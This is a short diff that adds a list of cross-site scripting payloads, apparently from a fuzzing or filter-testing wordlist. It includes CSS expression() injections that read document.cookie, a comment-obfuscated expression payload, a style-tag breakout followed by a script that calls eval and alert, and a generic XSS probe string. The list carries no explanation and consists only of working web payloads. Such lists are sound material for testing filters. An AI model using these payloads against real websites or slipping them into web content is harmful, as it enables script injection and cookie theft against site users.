@@ -1,0 +1,9 @@
+width: expression((window.r==document.cookie)?'':alert(r=document.cookie))
+style=color: expression(alert(0));" a="
+
+exp/*<XSS STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
+
+
+}</style><script>a=eval;b=alert;a(b(/i/.source));</script>
+
+'';!--"<XSS>=&{()}
